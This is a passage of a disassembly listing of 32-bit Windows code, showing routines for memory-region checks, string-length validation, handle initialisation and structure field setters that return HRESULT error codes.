; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_19028       proc near               ; CODE XREF: sub_17CD8+B↑p
                                        ; sub_17F78+40↑p ...
                mov     eax, [ecx]
                xor     ecx, ecx
                cmp     eax, 2
                setz    cl
                mov     eax, ecx
                retn
sub_19028       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_19048       proc near               ; CODE XREF: sub_18588+56↑p
                                        ; sub_18918+12A↑p ...
                mov     eax, [ecx+4]
                retn
sub_19048       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19058       proc near               ; CODE XREF: sub_18918:loc_18A3B↑p

var_24          = byte ptr -24h
var_20          = dword ptr -20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 24h
                push    esi
                push    10020F4h
                call    dword ptr ds:10010D0h
                mov     esi, eax
                push    10020E0h
                push    esi
                call    dword ptr ds:100115Ch
                test    eax, eax
                mov     ds:100C73Ch, eax
                jnz     short loc_1908A
                push    esi
                call    dword ptr ds:10010DCh

loc_1908A:                              ; CODE XREF: sub_19058+29↑j
                lea     eax, [ebp+var_24]
                push    eax
                call    dword ptr ds:10010ACh
                mov     ecx, [ebp+var_20]
                mov     ds:100C740h, ecx
                pop     esi
                mov     esp, ebp
                pop     ebp
                retn
sub_19058       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_190A8       proc near               ; CODE XREF: sub_19348+29↓p

var_24          = dword ptr -24h
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 24h
                push    ebx
                push    edi
                mov     edi, [ebp+arg_0]
                test    edi, edi
                mov     ebx, edi
                jnz     short loc_190C5
                pop     edi
                xor     eax, eax
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_190C5:                              ; CODE XREF: sub_190A8+11↑j
                cmp     [ebp+arg_8], 0
                mov     [ebp+arg_0], 0CCh
                jz      short loc_190D9
                mov     [ebp+arg_0], 0EEh

loc_190D9:                              ; CODE XREF: sub_190A8+28↑j
                push    esi
                mov     esi, [ebp+arg_4]

loc_190DD:                              ; CODE XREF: sub_190A8+CE↓j
                cmp     dword ptr ds:100C73Ch, 0
                jz      short loc_19127
                push    8
                lea     eax, [ebp+var_8]
                push    eax
                mov     [ebp+var_8], edi
                call    dword ptr ds:1001070h
                push    eax
                call    dword ptr ds:100C73Ch
                test    eax, eax
                jz      short loc_19127
                mov     eax, [ebp+var_4]
                test    al, 1
                jz      short loc_19127
                mov     ecx, [ebp+arg_0]
                shr     eax, 4
                and     eax, 7FFh
                test    ecx, eax
                jz      short loc_1917C
                mov     ecx, ds:100C740h
                lea     eax, [ecx-1]
                not     eax
                and     eax, edi
                add     eax, ecx
                jmp     short loc_19160
; ---------------------------------------------------------------------------

loc_19127:                              ; CODE XREF: sub_190A8+3C↑j
                                        ; sub_190A8+56↑j ...
                push    1Ch
                lea     edx, [ebp+var_24]
                push    edx
                push    edi
                call    dword ptr ds:10010A8h
                cmp     eax, 1Ch
                jnz     short loc_1917C
                mov     eax, [ebp+var_24]
                mov     ecx, [ebp+var_18]
                add     eax, ecx
                cmp     ebx, eax
                jnb     short loc_19172
                cmp     [ebp+var_14], 1000h
                jnz     short loc_1917C
                mov     ecx, [ebp+var_10]
                mov     edx, [ebp+arg_0]
                test    edx, ecx
                jz      short loc_1917C
                test    ecx, 100h
                jnz     short loc_1917C

loc_19160:                              ; CODE XREF: sub_190A8+7D↑j
                mov     ecx, eax
                sub     ecx, ebx
                cmp     ecx, esi
                jb      short loc_1916A
                mov     ecx, esi

loc_1916A:                              ; CODE XREF: sub_190A8+BE↑j
                sub     esi, ecx
                add     ebx, ecx
                test    esi, esi
                jz      short loc_19187

loc_19172:                              ; CODE XREF: sub_190A8+9B↑j
                cmp     eax, ebx
                mov     edi, eax
                jbe     loc_190DD

loc_1917C:                              ; CODE XREF: sub_190A8+6C↑j
                                        ; sub_190A8+8F↑j ...
                pop     esi
                pop     edi
                xor     eax, eax
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_19187:                              ; CODE XREF: sub_190A8+C8↑j
                pop     esi
                pop     edi
                mov     eax, 1
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_190A8       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_191A8       proc near               ; CODE XREF: sub_19458+30↓p
                xor     eax, eax
                test    ecx, ecx
                push    esi
                mov     esi, ecx
                jz      short loc_191CB
                lea     esp, [esp+0]

loc_191B8:                              ; CODE XREF: sub_191A8+1B↓j
                cmp     [edx], ax
                jz      short loc_191C7
                add     edx, 2
                sub     ecx, 1
                jnz     short loc_191B8
                jmp     short loc_191CB
; ---------------------------------------------------------------------------

loc_191C7:                              ; CODE XREF: sub_191A8+13↑j
                test    ecx, ecx
                jnz     short loc_191D0

loc_191CB:                              ; CODE XREF: sub_191A8+7↑j
                                        ; sub_191A8+1D↑j
                mov     eax, 80070057h

loc_191D0:                              ; CODE XREF: sub_191A8+21↑j
                test    edi, edi
                jz      short loc_191E4
                test    eax, eax
                jl      short loc_191DE
                sub     esi, ecx
                mov     [edi], esi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_191DE:                              ; CODE XREF: sub_191A8+2E↑j
                mov     dword ptr [edi], 0

loc_191E4:                              ; CODE XREF: sub_191A8+2A↑j
                pop     esi
                retn
sub_191A8       endp

; ---------------------------------------------------------------------------
                db 12h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_191F8       proc near               ; CODE XREF: sub_18918+35↑p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ABF8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                xor     ebx, ebx
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     [ebp+var_4], ebx
                cmp     [esi], ebx
                jnz     short loc_19269
                push    ebx
                push    offset byte_10000
                push    ebx
                call    dword ptr ds:10010A4h
                mov     [esi], eax
                test    eax, eax
                jnz     short loc_19269
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_19264
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_19264:                              ; CODE XREF: sub_191F8+60↑j
                mov     edi, eax
                mov     [ebp+var_1C], edi

loc_19269:                              ; CODE XREF: sub_191F8+43↑j
                                        ; sub_191F8+56↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_192AB
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_20], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_19298
                call    dword ptr ds:10011F4h

loc_19298:                              ; CODE XREF: sub_191F8+98↑j
                test    esi, esi
                jl      short loc_192A1
                mov     ebx, 80004005h

loc_192A1:                              ; CODE XREF: sub_191F8+A2↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+var_1C]

loc_192AB:                              ; CODE XREF: sub_191F8+78↑j
                test    edi, edi
                mov     eax, ebx
                jge     short loc_192B3
                mov     eax, edi

loc_192B3:                              ; CODE XREF: sub_191F8+B7↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_191F8       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_192D8       proc near               ; CODE XREF: sub_18918+22↑p
                                        ; sub_1B098+18↓p
                mov     edi, edi
                push    esi
                push    0
                mov     esi, ecx
                push    1
                push    esi
                call    dword ptr ds:1001134h
                test    eax, eax
                jnz     short loc_192F3
                mov     eax, 1
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_192F3:                              ; CODE XREF: sub_192D8+12↑j
                mov     eax, [esi]
                cmp     eax, 2
                jz      short loc_19314
                push    edi
                mov     edi, ds:1001050h
                lea     esp, [esp+0]

loc_19308:                              ; CODE XREF: sub_192D8+39↓j
                push    1
                call    edi
                mov     ecx, [esi]
                cmp     ecx, 2
                jnz     short loc_19308
                pop     edi

loc_19314:                              ; CODE XREF: sub_192D8+20↑j
                xor     eax, eax
                pop     esi
                retn
sub_192D8       endp

; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19328       proc near               ; CODE XREF: sub_18918+11A↑p
                                        ; sub_1B098+4B↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    1
                push    2
                push    ecx
                mov     [ecx+4], eax
                call    dword ptr ds:1001134h
                pop     ebp
                retn    4
sub_19328       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19348       proc near               ; CODE XREF: sub_195A8+11↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                test    edi, edi
                mov     [ebp+var_4], 0
                jz      short loc_193D4
                mov     ebx, [ebp+arg_0]
                test    ebx, ebx
                jz      short loc_193D4
                mov     esi, [ebp+arg_8]
                test    esi, esi
                jz      short loc_193D4
                push    1
                push    esi
                push    edi
                call    sub_190A8
                test    eax, eax
                jnz     short loc_19388
                pop     edi
                pop     esi
                mov     eax, 800703E6h
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_19388:                              ; CODE XREF: sub_19348+30↑j
                lea     eax, [ebp+var_4]
                push    eax
                push    esi
                push    ebx
                push    edi
                call    dword ptr ds:1001070h
                push    eax
                call    dword ptr ds:10010A0h
                test    eax, eax
                jz      short loc_193B7
                mov     eax, [ebp+var_4]
                sub     eax, esi
                neg     eax
                pop     edi
                sbb     eax, eax
                pop     esi
                and     eax, 8007012Bh
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_193B7:                              ; CODE XREF: sub_19348+56↑j
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_193D9
                pop     edi
                and     eax, 0FFFFh
                pop     esi
                or      eax, 80070000h
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_193D4:                              ; CODE XREF: sub_19348+15↑j
                                        ; sub_19348+1C↑j ...
                mov     eax, 80070057h

loc_193D9:                              ; CODE XREF: sub_19348+77↑j
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_19348       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_193E8       proc near               ; CODE XREF: sub_19458+62↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                xor     eax, eax
                test    ecx, ecx
                jz      short loc_193FE
                cmp     ecx, 7FFFFFFFh
                jbe     short loc_19403

loc_193FE:                              ; CODE XREF: sub_193E8+C↑j
                mov     eax, 80070057h

loc_19403:                              ; CODE XREF: sub_193E8+14↑j
                test    eax, eax
                jl      short loc_1944E
                mov     eax, [ebp+arg_10]
                mov     edx, [ebp+arg_8]
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                push    eax
                lea     esi, [ecx-1]
                mov     ecx, [ebp+arg_C]
                push    ecx
                push    edx
                push    esi
                push    edi
                xor     ebx, ebx
                call    dword ptr ds:10011F8h
                add     esp, 14h
                test    eax, eax
                jl      short loc_19440
                cmp     eax, esi
                ja      short loc_19440
                jnz     short loc_19449
                mov     [edi+esi*2], bx
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn    14h
; ---------------------------------------------------------------------------

loc_19440:                              ; CODE XREF: sub_193E8+43↑j
                                        ; sub_193E8+47↑j
                mov     [edi+esi*2], bx
                mov     ebx, 8007007Ah

loc_19449:                              ; CODE XREF: sub_193E8+49↑j
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx

loc_1944E:                              ; CODE XREF: sub_193E8+1D↑j
                pop     ebp
                retn    14h
sub_193E8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19458       proc near               ; CODE XREF: sub_19F98+2E↓p
                                        ; sub_1AA68+98↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = byte ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_4]
                cmp     esi, 7FFFFFFFh
                jbe     short loc_19471
                mov     eax, 80070057h
                pop     esi
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_19471:                              ; CODE XREF: sub_19458+F↑j
                push    ebx
                mov     ebx, [ebp+arg_0]
                test    ebx, ebx
                push    edi
                mov     [ebp+arg_4], 0
                jz      short loc_19495
                lea     edi, [ebp+arg_4]
                mov     ecx, esi
                mov     edx, ebx
                call    sub_191A8
                test    eax, eax
                jge     short loc_1949E
                xor     edi, edi
                jmp     short loc_194A1
; ---------------------------------------------------------------------------

loc_19495:                              ; CODE XREF: sub_19458+27↑j
                mov     eax, 80070057h
                xor     edi, edi
                jmp     short loc_194A1
; ---------------------------------------------------------------------------

loc_1949E:                              ; CODE XREF: sub_19458+37↑j
                mov     edi, [ebp+arg_4]

loc_194A1:                              ; CODE XREF: sub_19458+3B↑j
                                        ; sub_19458+44↑j
                test    eax, eax
                jl      short loc_194BF
                lea     eax, [ebp+arg_C]
                push    eax
                call    sub_14E89
                mov     ecx, [ebp+arg_8]
                push    eax
                push    ecx
                sub     esi, edi
                push    esi
                lea     edx, [ebx+edi*2]
                push    edx
                call    sub_193E8

loc_194BF:                              ; CODE XREF: sub_19458+4B↑j
                pop     edi
                pop     ebx
                pop     esi
                pop     ebp
                retn
sub_19458       endp

; ---------------------------------------------------------------------------
                db 14h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_194D8       proc near               ; CODE XREF: sub_18828+4A↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                mov     edi, [ebp+arg_C]
                push    100182Ch
                push    edi
                lea     eax, [edi+edi]
                xor     ebx, ebx
                push    esi
                mov     [ebp+var_4], ebx
                mov     [ebp+arg_C], eax
                call    sub_14A14
                cmp     [ebp+arg_C], edi
                jnb     short loc_19511
                pop     edi
                pop     esi
                mov     eax, 80070057h
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
; ---------------------------------------------------------------------------

loc_19511:                              ; CODE XREF: sub_194D8+29↑j
                mov     eax, [ebp+arg_4]
                lea     ecx, [ebp+arg_C]
                push    ecx
                mov     ecx, [ebp+arg_0]
                push    esi
                lea     edx, [ebp+var_4]
                push    edx
                push    0
                push    eax
                push    ecx
                call    dword ptr ds:1001004h
                test    eax, eax
                jnz     short loc_19581
                cmp     [ebp+var_4], 1
                jnz     short loc_19571
                mov     eax, [ebp+arg_C]
                test    al, 1
                jnz     short loc_19571
                cmp     eax, 2
                jb      short loc_19571
                shr     eax, 1
                sub     eax, 1
                cmp     [esi+eax*2], bx
                jz      short loc_1958F
                add     eax, 1
                cmp     eax, edi
                jnb     short loc_19561
                mov     [esi+eax*2], bx
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
; ---------------------------------------------------------------------------

loc_19561:                              ; CODE XREF: sub_194D8+78↑j
                pop     edi
                mov     ebx, 8007007Ah
                pop     esi
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
; ---------------------------------------------------------------------------

loc_19571:                              ; CODE XREF: sub_194D8+5A↑j
                                        ; sub_194D8+61↑j ...
                pop     edi
                mov     ebx, 8007000Bh
                pop     esi
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
; ---------------------------------------------------------------------------

loc_19581:                              ; CODE XREF: sub_194D8+54↑j
                jle     short loc_1958D
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_1958D:                              ; CODE XREF: sub_194D8:loc_19581↑j
                mov     ebx, eax

loc_1958F:                              ; CODE XREF: sub_194D8+71↑j
                pop     edi
                pop     esi
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
sub_194D8       endp

; ---------------------------------------------------------------------------
                db 0Eh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_195A8       proc near

arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_C]
                mov     ecx, [ebp+arg_8]
                mov     edx, [ebp+arg_4]
                push    eax
                push    ecx
                push    edx
                call    sub_19348
                pop     ebp
                retn    10h
sub_195A8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_195C8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+40h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_195C8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_195E8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                cmp     dword ptr [esi+40h], 0
                push    edi
                jz      short loc_19625
                mov     eax, [esi+68h]
                not     eax
                and     eax, [esi+64h]
                test    al, 20h
                jnz     short loc_19625
                mov     edi, ds:1001148h
                call    edi
                cmp     eax, [esi+40h]
                jz      short loc_19625
                call    edi
                cmp     eax, [esi+60h]
                jz      short loc_19625
                mov     ecx, [ebp+arg_4]
                xor     eax, eax
                pop     edi
                mov     [ecx], eax
                pop     esi
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_19625:                              ; CODE XREF: sub_195E8+E↑j
                                        ; sub_195E8+1A↑j ...
                mov     edx, [ebp+arg_4]
                mov     eax, 1
                pop     edi
                mov     [edx], eax
                xor     eax, eax
                pop     esi
                pop     ebp
                retn    8
sub_195E8       endp

; ---------------------------------------------------------------------------
                db 11h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19648       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+0B20h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19648       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19668       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+54h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19668       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19688       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                mov     [eax+58h], ecx
                mov     [eax+5Ch], edx
                xor     eax, eax
                pop     ebp
                retn    0Ch
sub_19688       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_196A8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                mov     [eax+6Ch], ecx
                mov     [eax+70h], edx
                xor     eax, eax
                pop     ebp
                retn    0Ch
sub_196A8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_196C8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_8]
                mov     eax, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                mov     [esi+68h], ecx
                mov     ecx, [esi+8]
                test    ecx, ecx
                mov     [esi+64h], eax
                jz      short loc_196FA
                call    sub_17CF8
                test    eax, eax
                jz      short loc_196FA
                mov     eax, 20000h
                test    [esi+68h], eax
                jnz     short loc_196FA
                or      [esi+64h], eax

loc_196FA:                              ; CODE XREF: sub_196C8+1A↑j
                                        ; sub_196C8+23↑j ...
                xor     eax, eax
                pop     esi
                pop     ebp
                retn    0Ch
sub_196C8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19708       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+24h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19708       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19728       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+20h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19728       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19748       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                mov     [eax+60h], ecx
                mov     ecx, [ebp+arg_C]
                mov     [eax+1Ch], edx
                mov     [eax+18h], ecx
                xor     eax, eax
                pop     ebp
                retn    10h
sub_19748       endp

; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19778       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+48h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19778       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19798       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+2Ch], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19798       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_197B8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+28h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_197B8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_197D8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+14h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_197D8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_197F8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+30h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_197F8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19818       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                mov     [eax+4Ch], ecx
                mov     [eax+50h], edx
                xor     eax, eax
                pop     ebp
                retn    0Ch
sub_19818       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19838       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+34h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19838       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19858       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+38h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19858       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19878       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     [eax+0B34h], ecx
                xor     eax, eax
                pop     ebp
                retn    8
sub_19878       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_19898       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                cmp     dword ptr [ecx+0B30h], 0
                mov     eax, 80004005h
                jz      short loc_198CD
                cmp     dword ptr [ecx+0B2Ch], 0
                jnz     short loc_198CD
                cmp     dword ptr [ecx+0B28h], 0
                jz      short loc_198CD
                mov     ecx, [ecx+0B24h]
                mov     edx, [ebp+arg_4]
                xor     eax, eax
                mov     [edx], ecx

loc_198CD:                              ; CODE XREF: sub_19898+14↑j
                                        ; sub_19898+1D↑j ...
                pop     ebp
                retn    8
sub_19898       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_198D8       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                mov     edi, [ebp+arg_4]
                push    edi
                push    100138Ch
                mov     dword ptr [esi], 0
                call    sub_17B08
                test    eax, eax
                jnz     short loc_19909
                push    edi
                push    1002128h
                call    sub_17B08
                test    eax, eax
